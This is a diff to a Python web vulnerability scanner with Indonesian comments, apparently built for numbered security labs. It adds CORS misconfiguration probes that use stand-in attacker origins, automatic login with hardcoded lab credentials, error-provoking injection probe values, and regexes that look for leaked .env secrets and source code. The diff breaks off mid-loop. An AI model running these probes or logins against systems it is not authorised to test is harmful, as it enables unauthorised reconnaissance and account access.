@@ -2482,86 +2482,7 @@ class SatriaBaruScanner:
 
 
 
-    # ======================== CORS (konservatif, probe Origin terkontrol) ========================
-
-    def _cors_candidate_urls(self, pages: list[Page]) -> list[str]:
-        urls = [self.target_url]
-        base = self.target_url.rstrip("/")
-        # Endpoint sensitif umum (account/detail/api/key/profile) yang sering mengembalikan data/ACAO reflektif
-        suffixes = (
-            "/accountDetails", "/accountDetails/", "/account", "/account/details", "/account/detail",
-            "/my-account", "/my-account/", "/my-account?id=1", "/my-account?id=wiener", "/myaccount",
-            "/api/key", "/api/account", "/api/user", "/api/profile", "/api/me", "/api/whoami", "/api/accountDetails",
-            "/user", "/user/details", "/users/me", "/profile", "/me", "/whoami",
-            "/accountDetail", "/accountdetails", "/details", "/login",
-        )
-        for suffix in suffixes:
-            urls.append(base + suffix)
-            urls.append(urljoin(self.target_url, suffix.lstrip("/")))
-        for page in pages[:40]:
-            urls.append(page.url)
-            for form in getattr(page, "forms", [])[:12]:
-                if getattr(form, "action", None):
-                    urls.append(form.action)
-            for link in getattr(page, "links", [])[:60]:
-                if link:
-                    urls.append(str(link))
-            blob = (page.text or "") + "\n" + (page.js_text or "")
-            # path literal dari HTML/JS (account/api/key/detail/profile/me)
-            for m in re.finditer(r"""['"](/[^'"\s<>]{1,220})['"]""", blob):
-                cand = m.group(1).strip()
-                if cand.startswith("//"):
-                    continue
-                urls.append(urljoin(page.url, cand))
-            # fetch/XHR/axios/open endpoints
-            for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|open)\s*\(\s*(?:['"][A-Z]+['"]\s*,\s*)?['"]([^'"]{1,220})['"]""", blob, re.I):
-                cand = m.group(1).strip()
-                if cand.startswith("/") and not cand.startswith("//"):
-                    urls.append(urljoin(page.url, cand))
-                elif re.match(r"^https?://", cand, re.I):
-                    urls.append(cand)
-            # URL penuh pada atribut/data-*
-            for m in re.finditer(r"""https?://[^\s"'<>]+""", blob, re.I):
-                urls.append(m.group(0))
-        out: list[str] = []
-        seen = set()
-        for u in urls:
-            if not u:
-                continue
-            try:
-                cu = canonical_url(u)
-            except Exception:
-                cu = str(u)
-            if not cu or cu in seen or not self._same_origin(cu):
-                continue
-            seen.add(cu)
-            out.append(cu)
-
-        def score(u: str) -> int:
-            ul = (u or "").lower()
-            s = 0
-            for kw, w in (("accountdetails", 12), ("accountdetail", 12), ("account", 8),
-                          ("detail", 5), ("/api/", 6), ("api", 4), ("key", 6), ("user", 5),
-                          ("profile", 5), ("me", 5), ("whoami", 5), ("my-account", 8), ("login", 2)):
-                if kw in ul:
-                    s += w
-            if ul.rstrip("/").endswith(("accountdetails", "accountdetail")):
-                s += 6
-            return -s
-        out.sort(key=score)
-        # pastikan target utama tetap dicoba lebih awal
-        ordered = []
-        seen2 = set()
-        for u in [self.target_url] + out:
-            try:
-                cu = canonical_url(u)
-            except Exception:
-                cu = u
-            if not cu or cu in seen2:
-                continue
-            seen2.add(cu)
-            ordered.append(cu)
-        return ordered[:60]
+    # ======================== CORS (72-74, multi-vektor, bukti header terverifikasi) ========================
 
     @staticmethod
     def _resp_header(headers: dict[str, str] | None, name: str) -> str | None:
@@ -2573,137 +2494,386 @@ class SatriaBaruScanner:
                 return str(v)
         return None
 
-    def _cors_probe_once(self, url: str, origin: str) -> tuple["Response", str | None, str | None]:
-        resp = self._request("GET", url, headers={"Origin": origin, "Accept": "application/json, text/plain, */*"},
-                             allow_redirects=False)
-        acao = self._resp_header(resp.headers, "Access-Control-Allow-Origin")
-        acac = self._resp_header(resp.headers, "Access-Control-Allow-Credentials")
-        return resp, acao, acac
+    @staticmethod
+    def _cors_norm_origin(value: str | None) -> str:
+        """Normalisasi nilai origin/ACAO agar perbandingan tidak sensitif pada casing scheme/host."""
+        raw = (value or "").strip().strip('"').strip("'")
+        if not raw:
+            return ""
+        if raw.lower() == "null":
+            return "null"
+        if not re.match(r"^https?://", raw, re.I):
+            return raw.lower().rstrip("/")
+        p = urlparse(raw)
+        host = (p.hostname or "").lower().rstrip(".")
+        if not host:
+            return raw.lower().rstrip("/")
+        port = f":{p.port}" if p.port else ""
+        return f"{p.scheme.lower()}://{host}{port}"
 
-    def _cors_collect_probes(self, url: str, origin: str) -> list[tuple["Response", str | None, str | None, str]]:
-        """Kumpulkan bukti ACAO dari respons awal dan rantai redirect same-origin (hingga 3 hop)."""
-        probes: list[tuple[Response, str | None, str | None, str]] = []
-        if not self._within_budget():
-            return probes
-        resp, acao, acac = self._cors_probe_once(url, origin)
-        probes.append((resp, acao, acac, url))
-        cur_resp = resp
-        cur_url = url
-        for _ in range(3):
-            if not cur_resp.is_redirect:
+    def _lab_session_login(self) -> bool:
+        """Login ke aplikasi target memakai kredensial lab terdokumentasi (env SATRIA_USERNAME/PASSWORD).
+
+        Banyak lab CORS/XXE hanya mengirim header/konten rentan pada sesi terautentikasi. Login
+        dilakukan sekali dan cookie disimpan pada session requests yang sama.
+        """
+        state = getattr(self, "_satria_login_state", None)
+        if state is not None:
+            return bool(state)
+        self._satria_login_state = False
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        creds: list[tuple[str, str]] = []
+        env_user = (os.getenv("SATRIA_USERNAME") or "").strip()
+        env_pass = (os.getenv("SATRIA_PASSWORD") or "").strip()
+        if env_user and env_pass:
+            creds.append((env_user, env_pass))
+        creds.append(("wiener", "peter"))
+
+        login_urls: list[str] = []
+        for cand in (self.target_url, "/login", "/signin", "/auth/login", "/my-account", "/account/login"):
+            u = urljoin(base + "/", cand.lstrip("/")) if cand.startswith("/") else cand
+            if u not in login_urls:
+                login_urls.append(u)
+
+        for login_url in login_urls:
+            if not self._within_budget():
                 break
-            loc = self._resp_header(cur_resp.headers, "Location")
+            page = self._request("GET", login_url, allow_redirects=True)
+            if page.error or not page.text:
+                continue
+            try:
+                soup = BeautifulSoup(page.text, "html.parser")
+            except Exception:
+                continue
+            for form in soup.find_all("form"):
+                pw_input = form.find("input", {"type": "password"})
+                if not pw_input or not pw_input.get("name"):
+                    continue
+                action = urljoin(page.url, form.get("action") or page.url)
+                if not self._same_origin(action):
+                    continue
+                data: dict[str, str] = {}
+                user_field = ""
+                for inp in form.find_all("input"):
+                    name = inp.get("name")
+                    if not name:
+                        continue
+                    typ = (inp.get("type") or "text").lower()
+                    if typ in {"submit", "button", "image", "reset", "file", "checkbox", "radio"}:
+                        continue
+                    data[name] = str(inp.get("value") or "")
+                    if not user_field and typ in {"text", "email"}:
+                        user_field = name
+                if not user_field:
+                    for cand in ("username", "email", "user", "login"):
+                        if cand in data:
+                            user_field = cand
+                            break
+                if not user_field:
+                    continue
+                pw_name = str(pw_input.get("name"))
+                for username, password in creds:
+                    if not self._within_budget():
+                        break
+                    payload = dict(data)
+                    payload[user_field] = username
+                    payload[pw_name] = password
+                    resp = self._request("POST", action, data=payload, allow_redirects=True)
+                    if resp.error:
+                        continue
+                    low = (resp.text or "").lower()
+                    if any(tok in low for tok in ("incorrect password", "invalid username", "invalid credentials", "login failed")):
+                        continue
+                    check = self._request("GET", urljoin(base + "/", "my-account"), allow_redirects=True)
+                    ctxt = ((check.text or "") + " " + (resp.text or "")).lower()
+                    authed = check.status == 200 and any(tok in ctxt for tok in ("logout", "log out", "your username", "my account", "account details"))
+                    if not authed and resp.status in (301, 302, 303, 307, 308):
+                        dest = urljoin(resp.url or action, self._resp_header(resp.headers, "Location") or "")
+                        authed = bool(dest) and not re.search(r"(login|signin|auth)", dest, re.I)
+                    if authed:
+                        self._satria_login_state = True
+                        return True
+                break
+        return False
+
+    def _cors_is_asset(self, url: str) -> bool:
+        path = urlparse(url).path or "/"
+        return bool(re.search(r"\.(?:css|js|mjs|png|jpe?g|gif|svg|ico|bmp|woff2?|ttf|otf|eot|map|pdf|zip|mp4|webp|avif)$", path, re.I))
+
+    def _cors_candidate_urls(self, pages: list[Page]) -> list[str]:
+        """Kandidat endpoint CORS: halaman terautentikasi, API dari HTML/JS, dan endpoint sensitif umum."""
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        seeds: list[str] = []
+
+        def add(raw: str) -> None:
+            raw = (raw or "").strip()
+            if not raw or raw.startswith(("javascript:", "mailto:", "data:", "#", "tel:")):
+                return
+            try:
+                absolute = raw if re.match(r"^https?://", raw, re.I) else urljoin(base + "/", raw.lstrip("/"))
+                cu = canonical_url(absolute)
+            except Exception:
+                return
+            if not cu or not self._same_origin(cu):
+                return
+            if DESTRUCTIVE_PATH_RE.search(urlparse(cu).path or "/"):
+                return
+            if self._cors_is_asset(cu):
+                return
+            seeds.append(cu)
+
+        add(self.target_url)
+        for path in (
+            "my-account", "account", "accountDetails", "accountDetails/", "account/details",
+            "api/accountDetails", "api/account", "api/user", "api/profile", "api/me", "api/key",
+            "api/whoami", "user", "users/me", "profile", "settings", "me", "whoami",
+            "accountDetail", "accountdetails", "details",
+        ):
+            add(path)
+
+        for page in pages[:40]:
+            add(page.url)
+            for link in getattr(page, "links", [])[:50]:
+                add(str(link))
+            blob = (page.text or "") + "\n" + (page.js_text or "")
+            for m in re.finditer(r"""['"](/[A-Za-z0-9_\-./?=&%]{1,200})['"]""", blob):
+                add(m.group(1))
+            for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|\.open)\s*\(\s*(?:['"][A-Za-z]+['"]\s*,\s*)?['"]([^'"]{1,220})['"]""", blob, re.I):
+                add(m.group(1))
+
+        # Setelah login, halaman akun memuat endpoint API yang benar-benar dipakai aplikasi.
+        if self._lab_session_login():
+            for path in ("my-account", "account", "profile", "settings"):
+                if not self._within_budget():
+                    break
+                url = urljoin(base + "/", path)
+                resp = self._request("GET", url, allow_redirects=False)
+                if resp.error or resp.status not in (200, 301, 302, 303, 307, 308):
+                    continue
+                add(url)
+                blob = resp.text or ""
+                for m in re.finditer(r"""['"](/[A-Za-z0-9_\-./?=&%]{1,200})['"]""", blob):
+                    add(m.group(1))
+                for m in re.finditer(r"""\b(?:fetch|axios\.(?:get|post|request)|\.open)\s*\(\s*(?:['"][A-Za-z]+['"]\s*,\s*)?['"]([^'"]{1,220})['"]""", blob, re.I):
+                    add(m.group(1))
+                if resp.status == 200 and ("logout" in blob.lower() or "my account" in blob.lower()):
+                    break
+
+        def score(u: str) -> int:
+            ul = (u or "").lower()
+            s = 0
+            for kw, w in (("accountdetails", 14), ("accountdetail", 14), ("account", 9), ("/api/", 8),
+                          ("api", 5), ("key", 8), ("profile", 7), ("whoami", 7), ("/me", 6),
+                          ("user", 6), ("detail", 5), ("my-account", 9), ("session", 4)):
+                if kw in ul:
+                    s += w
+            if urlparse(ul).query:
+                s += 1
+            return -s
+
+        out: list[str] = []
+        seen = set()
+        for u in seeds:
+            if u in seen:
+                continue
+            seen.add(u)
+            out.append(u)
+        out.sort(key=score)
+        ordered: list[str] = []
+        seen2 = set()
+        try:
+            top = canonical_url(self.target_url)
+        except Exception:
+            top = self.target_url
+        for u in out:
+            cu = u
+            if cu in seen2:
+                continue
+            seen2.add(cu)
+            ordered.append(cu)
+        if top in ordered:
+            ordered.remove(top)
+        return [top] + ordered[:6]
+
+    def _cors_probe(self, url: str, origin: str, method: str = "GET") -> list[tuple["Response", str | None, str | None, str]]:
+        """Probe Origin dan kumpulkan ACAO/ACAC termasuk setelah redirect same-origin (cache per fase)."""
+        cache = getattr(self, "_cors_cache", None)
+        if cache is None:
+            cache = {}
+            self._cors_cache = cache
+        key = (url, origin, method)
+        if key in cache:
+            return cache[key]
+        headers = {
+            "Origin": origin,
+            "Accept": "application/json, text/plain, */*",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Site": "cross-site",
+        }
+        data = None
+        if method == "POST":
+            headers["Content-Type"] = "application/json"
+            data = "{}"
+        results: list[tuple[Response, str | None, str | None, str]] = []
+        resp = self._request(method, url, headers=headers, data=data, allow_redirects=False)
+        results.append((resp, self._resp_header(resp.headers, "Access-Control-Allow-Origin"),
+                        self._resp_header(resp.headers, "Access-Control-Allow-Credentials"), url))
+        cur, cur_url = resp, url
+        for _ in range(2):
+            if not cur.is_redirect or not self._within_budget():
+                break
+            loc = self._resp_header(cur.headers, "Location")
             if not loc:
                 break
             dest = urljoin(cur_url, loc)
-            if not self._same_origin(dest) or not self._within_budget():
+            if not self._same_origin(dest):
                 break
             cur_url = dest
-            cur_resp, acao2, acac2 = self._cors_probe_once(cur_url, origin)
-            probes.append((cur_resp, acao2, acac2, cur_url))
-        return probes
+            cur = self._request(method, cur_url, headers=headers, data=data, allow_redirects=False)
+            results.append((cur, self._resp_header(cur.headers, "Access-Control-Allow-Origin"),
+                            self._resp_header(cur.headers, "Access-Control-Allow-Credentials"), cur_url))
+        cache[key] = results
+        return results
 
     @staticmethod
-    def _cors_origin_reflected(acao: str | None, origin: str) -> bool:
-        if not acao:
+    def _cors_dataish(resp: "Response") -> bool:
+        if resp.status is None or resp.status >= 400 or not resp.text:
             return False
-        v = acao.strip()
-        if not v or v == "*":
-            return False
-        if origin == "null":
-            return v.lower() == "null"
-        return v == origin
+        ctype = ""
+        for k, v in (resp.headers or {}).items():
+            if str(k).lower() == "content-type":
+                ctype = str(v).lower()
+                break
+        body = resp.text
+        if "json" in ctype:
+            return True
+        if re.search(r'"(?:api[_-]?key|apikey|email|username|session|token|id|role|admin)"\s*:', body, re.I):
+            return True
+        return bool(re.search(r"\b[\w.+-]+@[\w.-]+\.[A-Za-z]{2,}\b", body))
+
+    def _cors_confirmed_reflection(self, probes, origin: str):
+        """Kembalikan bukti hanya jika ACAO persis origin probe (bukan wildcard) dan respons berisi data/kredensial."""
+        want = self._cors_norm_origin(origin)
+        for resp, acao, acac, probe_url in probes:
+            if resp.error or resp.status is None or resp.status >= 400:
+                continue
+            if not acao:
+                continue
+            got = self._cors_norm_origin(acao)
+            if not got or got == "*" or got != want:
+                continue
+            creds = (acac or "").strip().lower() == "true"
+            if creds or self._cors_dataish(resp):
+                return resp, acao, acac, probe_url
+        return None
 
     def phase_cors(self, pages: list[Page]) -> None:
-        """Deteksi CORS misconfiguration dengan probe Origin terkontrol.
-        Konfirmasi hanya jika header CORS merespons dengan refleksi origin yang diminta
-        secara eksplisit sesuai skenario lab (bukti header jelas) untuk menghindari false positive."""
+        """Deteksi CORS misconfiguration (72-74) dengan probe Origin terkontrol.
+
+        Konfirmasi mensyaratkan Access-Control-Allow-Origin persis sama dengan origin penyerang
+        (bukan wildcard) pada respons berisi data atau dengan Access-Control-Allow-Credentials: true.
+        Untuk 73/74 ditambahkan pemeriksaan pembeda: origin https eksternal arbitrer TIDAK
+        direfleksikan, sehingga target lab 72 (reflect-all) tidak salah diklaim 73/74.
+        """
+        if not self._within_budget():
+            return
         urls = self._cors_candidate_urls(pages)
         if not urls:
             return
-        target_host = (urlparse(self.target_url).hostname or "").strip().lower()
-        # 72: origin https arbitrer (banyak variasi, refleksi persis)
-        evil_https_list = [
-            "https://evil-example.test",
-            "https://attacker.example",
-            "https://attacker.com",
-            "https://evil.com",
-        ]
-        # 74: origin http tidak aman yang mungkin dipercaya (subdomain/host terkait target, refleksi persis http://)
-        http_origin_list: list[str] = []
-        seen_o = set()
-        def add_http(o: str):
-            if not o or o in seen_o:
-                return
-            seen_o.add(o)
-            http_origin_list.append(o)
-        for base_http in ("http://evil-example.test", "http://attacker.example", "http://insecure.example"):
-            add_http(base_http)
-        if target_host:
-            host_parts = target_host.split(".")
-            add_http(f"http://{target_host}")
-            # subdomain http pada host target
-            for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev", "www"):
-                add_http(f"http://{sub}.{target_host}")
-            # subdomain http pada domain induk (sering dipercaya via regex/suffix)
-            if len(host_parts) >= 2:
-                parent2 = ".".join(host_parts[-2:])
-                for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev", "www"):
-                    add_http(f"http://{sub}.{parent2}")
-            if len(host_parts) >= 3:
-                parent = ".".join(host_parts[1:])
-                for sub in ("insecure", "stock", "sub", "api", "test", "staging", "dev"):
-                    add_http(f"http://{sub}.{parent}")
-            # label utama host sebagai subdomain domain induk
-            if len(host_parts) >= 3:
-                label = host_parts[0]
-                parent = ".".join(host_parts[1:])
-                add_http(f"http://{label}.{parent}")
+        pu = urlparse(self.target_url)
+        host = (pu.hostname or "").lower()
+        https_origins = ["https://evil-cors-a.example", "https://evil-cors-b.example", "https://attacker.example.net"]
+        http_origins: list[str] = [f"http://stock.{host}", f"http://{host}", f"http://insecure.{host}", f"http://sub.{host}"]
+        try:
+            ipaddress.ip_address(host)
+            is_ip_host = True
+        except ValueError:
+            is_ip_host = False
+        if not is_ip_host and host.count(".") >= 2:
+            parent = ".".join(host.split(".")[-2:])
+            label0 = host.split(".")[0]
+            for label in ("stock", "insecure", "sub"):
+                http_origins.append(f"http://{label}.{parent}")
+                http_origins.append(f"http://{label}.{label0}.{parent}")
+        http_origins = http_origins[:5]
 
-        for url in urls:
-            if not self._within_budget():
-                return
-            point = Point(key="cors", kind="page", label=f"endpoint {url}", url=url,
-                          name="origin", original="", page_url=url, method="GET", interest=3)
+        # Peta per-URL: apakah origin https eksternal arbitrer direfleksikan (pembeda 72 vs 73/74).
+        external_reflected: dict[str, bool] = {}
 
-            # 72: basic origin reflection (arbitrary https origin reflected)
-            if 72 not in self._confirmed and self._within_budget():
-                for evil_https in evil_https_list:
-                    if 72 in self._confirmed or not self._within_budget():
-                        break
-                    for resp, acao, acac, probe_url in self._cors_collect_probes(url, evil_https):
-                        if self._cors_origin_reflected(acao, evil_https):
-                            ev = (f"Origin probe ({evil_https}) ke {probe_url} direfleksikan pada Access-Control-Allow-Origin={acao!r}"
-                                  + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                                  + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (refleksi origin arbitrer).")
-                            self._mark(72, point, ev, "cors_basic_origin_reflection")
-                            break
+        # --- 72: refleksi origin https arbitrer (divalidasi dengan origin kedua yang berbeda) ---
+        if 72 not in self._confirmed:
+            primary = https_origins[0]
+            for url in urls:
+                if 72 in self._confirmed or not self._within_budget():
+                    break
+                probes = self._cors_probe(url, primary)
+                hit = self._cors_confirmed_reflection(probes, primary)
+                external_reflected[url] = bool(hit)
+                if not hit:
+                    continue
+                second = https_origins[1]
+                probes2 = self._cors_probe(url, second)
+                hit2 = self._cors_confirmed_reflection(probes2, second)
+                if not hit2:
+                    continue
+                resp, acao, acac, probe_url = hit2
+                point = Point(key="cors-72", kind="page", label=f"endpoint {probe_url}", url=probe_url,
+                              name="Origin", original="", page_url=probe_url, method="GET", interest=5)
+                ev = (f"Origin arbitrer direfleksikan pada Access-Control-Allow-Origin: dua origin berbeda "
+                      f"({primary!r} dan {second!r}) diterima di {probe_url} (HTTP {resp.status}); "
+                      f"nilai terakhir ACAO={acao!r}"
+                      + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                      + ". Bukti header CORS terverifikasi (refleksi origin arbitrer).")
+                self._mark(72, point, ev, "cors_basic_origin_reflection")
 
-            # 73: trusted null origin
-            if 73 not in self._confirmed and self._within_budget():
-                for resp, acao, acac, probe_url in self._cors_collect_probes(url, "null"):
-                    if self._cors_origin_reflected(acao, "null"):
-                        ev = (f"Origin probe (null) ke {probe_url} diterima: Access-Control-Allow-Origin={acao!r}"
-                              + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                              + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (trusted null origin).")
-                        self._mark(73, point, ev, "cors_trusted_null_origin")
-                        break
+        # --- 73: trusted null origin (hanya null yang dipercaya) ---
+        if 73 not in self._confirmed:
+            for url in urls:
+                if 73 in self._confirmed or not self._within_budget():
+                    break
+                if external_reflected.get(url):
+                    continue
+                probes = self._cors_probe(url, "null")
+                hit = self._cors_confirmed_reflection(probes, "null")
+                if not hit:
+                    continue
+                resp, acao, acac, probe_url = hit
+                point = Point(key="cors-73", kind="page", label=f"endpoint {probe_url}", url=probe_url,
+                              name="Origin", original="", page_url=probe_url, method="GET", interest=5)
+                ev = (f"Origin 'null' dipercaya: Access-Control-Allow-Origin={acao!r} di {probe_url} "
+                      f"(HTTP {resp.status})"
+                      + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                      + "; origin https eksternal arbitrer tidak direfleksikan. Bukti header CORS terverifikasi "
+                      "(trusted null origin).")
+                self._mark(73, point, ev, "cors_trusted_null_origin")
+                break
 
-            # 74: trusted insecure protocols (origin http:// direfleksikan persis)
-            if 74 not in self._confirmed and self._within_budget():
-                for evil_http in http_origin_list:
+        # --- 74: protokol tidak aman (http) pada host/subdomain target dipercaya ---
+        if 74 not in self._confirmed:
+            for url in urls:
+                if 74 in self._confirmed or not self._within_budget():
+                    break
+                if external_reflected.get(url):
+                    continue
+                for origin in http_origins:
                     if 74 in self._confirmed or not self._within_budget():
                         break
-                    for resp, acao, acac, probe_url in self._cors_collect_probes(url, evil_http):
-                        if self._cors_origin_reflected(acao, evil_http) and evil_http.lower().startswith("http://"):
-                            ev = (f"Origin probe dengan skema http tidak aman ({evil_http}) ke {probe_url} direfleksikan: "
-                                  f"Access-Control-Allow-Origin={acao!r}"
-                                  + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
-                                  + f" (HTTP {resp.status}). Bukti berbasis header respons CORS terverifikasi (trusted insecure protocol).")
-                            self._mark(74, point, ev, "cors_trusted_insecure_protocols")
-                            break
-
-
+                    probes = self._cors_probe(url, origin)
+                    hit = self._cors_confirmed_reflection(probes, origin)
+                    if not hit:
+                        continue
+                    resp, acao, acac, probe_url = hit
+                    point = Point(key="cors-74", kind="page", label=f"endpoint {probe_url}", url=probe_url,
+                                  name="Origin", original="", page_url=probe_url, method="GET", interest=5)
+                    ev = (f"Origin dengan protokol http tidak aman ({origin!r}) direfleksikan pada "
+                          f"Access-Control-Allow-Origin={acao!r} di {probe_url} (HTTP {resp.status})"
+                          + (f", Access-Control-Allow-Credentials={acac!r}" if acac else "")
+                          + "; origin https eksternal arbitrer tidak direfleksikan. Bukti header CORS terverifikasi "
+                          "(trusted insecure protocol).")
+                    self._mark(74, point, ev, "cors_trusted_insecure_protocols")
+                    break
 
     # ======================== SSRF (konservatif, bukti respons/OOB terverifikasi) ========================
 
@@ -3306,156 +3476,458 @@ class SatriaBaruScanner:
 
 
 
-    # ======================== Information Disclosure (131-135, konservatif, bukti terverifikasi) ========================
+    # ======================== Information Disclosure (131-135, discovery mendalam & bukti terverifikasi) ========================
 
     def _info_mark(self, num: int, url: str, ev: str, method_name: str):
         point = Point(key=f"info-disc-{num}", kind="endpoint", label=f"Information disclosure {url}",
                       url=url, name="information-disclosure", original="", page_url=url, method="GET", interest=7)
         self._mark(num, point, ev, method_name)
 
-    def _info_sensitive_patterns(self):
-        return [
-            (re.compile(r"Traceback \(most recent call last\):", re.I), "Python traceback"),
-            (re.compile(r"(?:/[\w.\-]+){2,}\.(?:py|php|jsp|rb|java|cs|aspx)\b", re.I), "path sumber/kode internal"),
-            (re.compile(r"\b(?:SQLSTATE|PDOException|mysqli?_|\bORA-\d{5}|Microsoft OLE DB Provider|ODBC SQL Server Driver|Unclosed quotation mark)\b", re.I), "pesan/kesalahan database"),
-            (re.compile(r"\b(?:SECRET_KEY|API_KEY|DB_PASSWORD|DATABASE_URL|AWS_SECRET|PRIVATE KEY)\b", re.I), "indikasi rahasia/konfigurasi"),
-            (re.compile(r"\b(?:Apache/[0-9]|nginx/[0-9]|PHP/[0-9]|Tomcat/[0-9]|Werkzeug/[0-9]|Express)\b", re.I), "versi server/framework"),
-            (re.compile(r"\b(?:DEBUG\s*=\s*True|stack trace|exception report)\b", re.I), "mode debug/stack trace"),
+    @staticmethod
+    def _info_error_marker(text: str):
+        """Marker error/stack trace yang spesifik (bukan kata umum) untuk lab 131."""
+        if not text:
+            return None
+        checks = (
+            (re.compile(r"Traceback \(most recent call last\):[\s\S]{0,600}?File \"[^\"]+\", line \d+", re.I), "Python traceback"),
+            (re.compile(r"\bjava\.lang\.(?:NumberFormatException|NullPointerException|ClassCastException|IllegalArgumentException|IndexOutOfBoundsException|ArithmeticException)\b"), "Java exception"),
+            (re.compile(r"\bat (?:java|javax|org|com|sun|jakarta)\.[\w.$]+\([^)\n]*\.java:\d+\)"), "Java stack frame"),
+            (re.compile(r"\b(?:org\.apache\.struts|org\.springframework|org\.hibernate|com\.opensymphony|org\.apache\.tomcat)\.[\w.$]+"), "framework stack trace"),
+            (re.compile(r"(?:<b>)?(?:Fatal error|Parse error|Warning|Notice)(?:</b>)?:\s*[^\n]{0,200}\bon line\s*(?:<b>)?\d+"), "PHP error"),
+            (re.compile(r"\bUncaught (?:Exception|Error|ErrorException|TypeError)\b"), "PHP uncaught exception"),
+            (re.compile(r"Server Error in ['\"]?/['\"]? Application", re.I), "ASP.NET error page"),
+            (re.compile(r"\bSystem\.(?:NullReferenceException|InvalidOperationException|FormatException|ArgumentException|IndexOutOfRangeException)\b"), "ASP.NET exception"),
+            (re.compile(r"\bSQLSTATE\[\w+\]|\bPDOException\b|\bmysqli?_error\b"), "database exception"),
+            (re.compile(r"\b(?:SequelizeDatabaseError|PrismaClient\w*Error|MongooseError|MongoError|PG::\w+|InvalidTextRepresentation)\b"), "ORM/driver exception"),
+            (re.compile(r"\bWerkzeug Debugger\b|\bDjango\b[^\n]{0,40}\b(?:DEBUG|Traceback)\b"), "framework debug page"),
+        )
+        for pat, label in checks:
+            m = pat.search(text)
+            if m:
+                return label, m.group(0)
+        return None
+
+    @staticmethod
+    def _info_debug_markers(text: str) -> list[str]:
+        hits: list[str] = []
+        if not text:
+            return hits
+        if re.search(r"PHP Version\s*(?:</?[^>]+>\s*)*[5-8]\.\d", text, re.I) or ("phpinfo()" in text and re.search(r"php\.ini|PHP License|Configuration File", text, re.I)):
+            hits.append("phpinfo")
+        if re.search(r'"(?:propertySources|activeProfiles|systemProperties|systemEnvironment)"\s*:', text):
+            hits.append("Spring Actuator endpoint")
+        if re.search(r"(?m)^\s*(?:APP_KEY|APP_SECRET|DB_PASSWORD|DB_USERNAME|DATABASE_URL|SECRET_KEY|AWS_SECRET_ACCESS_KEY|MAIL_PASSWORD)\s*=", text):
+            hits.append("file .env")
+        if re.search(r"Apache Server Status for|Server Version:\s*Apache", text, re.I):
+            hits.append("Apache server-status")
+        if re.search(r'"(?:DJANGO_SETTINGS_MODULE|WERKZEUG_RUN_MAIN|FLASK_ENV)"\s*:', text) or "Werkzeug Debugger" in text:
+            hits.append("debug environment")
+        if re.search(r"<title>\s*(?:phpinfo\(\)|Debug|Console)\s*</title>", text, re.I) and re.search(r"PHP|debug|environment", text, re.I):
+            hits.append("halaman debug")
+        return hits
+
+    @staticmethod
+    def _info_source_marker(text: str):
+        if not text:
+            return None
+        checks = (
+            (re.compile(r"<\?php\b"), "PHP source"),
+            (re.compile(r"\bimport\s+java\.[\w.*]+;"), "Java source"),
+            (re.compile(r"\bpublic\s+(?:final\s+)?(?:class|interface|enum)\s+\w+"), "Java class"),
+            (re.compile(r"(?m)^\s*package\s+[\w.]+\s*;"), "Java package"),
+            (re.compile(r"\bfrom\s+(?:django|flask|app)\b[^\n]{0,80}\bimport\b|\bdef\s+\w+\s*\([^)]*\)\s*:"), "Python source"),
+            (re.compile(r"\brequire(?:_once)?\s*\(|\buse\s+strict\s*;|module\.exports\s*="), "JavaScript/Node source"),
+            (re.compile(r"(?:^|\n)\s*(?:namespace|using)\s+[\w.]+;"), ".NET source"),
+        )
+        for pat, label in checks:
+            m = pat.search(text)
+            if m:
+                return label, m.group(0)
+        return None
+
+    def _info_fetch(self, url: str, *, params=None, headers=None):
+        cache = getattr(self, "_info_cache", None)
+        if cache is None:
+            cache = {}
+            self._info_cache = cache
+        key = (url, tuple(sorted((params or {}).items())), tuple(sorted((headers or {}).items())))
+        if key in cache:
+            return cache[key]
+        resp = self._request("GET", url, params=params, headers=headers, allow_redirects=True)
+        cache[key] = resp
+        return resp
+
+    def _info_param_targets(self, pages: list[Page], points: list[Point]) -> list[tuple[str, str, str, str]]:
+        """(url tanpa query, parameter, nilai benign, sumber) untuk uji error message."""
+        out: list[tuple[str, str, str, str]] = []
+        seen = set()
+
+        def add(url: str, name: str, benign: str, source: str) -> None:
+            if not url or not name:
+                return
+            try:
+                p = urlparse(url)
+            except Exception:
+                return
+            clean = urlunparse((p.scheme, p.netloc, p.path or "/", "", "", ""))
+            if not self._same_origin(clean):
+                return
+            key = (clean, name)
+            if key in seen:
+                return
+            seen.add(key)
+            out.append((clean, name, benign or "1", source))
+
+        for point in points:
+            if point.kind not in {"query", "form"}:
+                continue
+            if point.kind == "form" and (point.method or "GET").upper() != "GET":
+                continue
+            p = urlparse(point.url)
+            clean = urlunparse((p.scheme, p.netloc, p.path or "/", "", "", ""))
+            add(clean, point.name, point.original, "crawl")
+        for page in pages[:12]:
+            p = urlparse(getattr(page, "url", "") or "")
+            for name, value in parse_qsl(p.query, keep_blank_values=True):
+                add(page.url, name, value or "1", "page-query")
+        pu = urlparse(self.target_url)
+        base = f"{pu.scheme}://{pu.netloc}"
+        for path, param in (("/product", "productId"), ("/product/stock", "productId")):
+            add(urljoin(base + "/", path.lstrip("/")), param, "1", "fixed")
+        return out[:7]
+
+    def _info_scan_error_messages(self, pages: list[Page], points: list[Point]) -> None:
+        if 131 in self._confirmed:
+            return
+        probes = ("abc", "1'\"", "999999999999999999999999999999", "-1", "null")
+        for clean_url, param, benign, source in self._info_param_targets(pages, points):
+            if 131 in self._confirmed or not self._within_budget():
+                return
+            try:
+                baseline = self._info_fetch(clean_url, params={param: benign})
+            except Exception:
+                continue
+            if baseline.error:
+                continue
+            base_text = baseline.text or ""
+            base_marker = self._info_error_marker(base_text)
+            for value in probes:
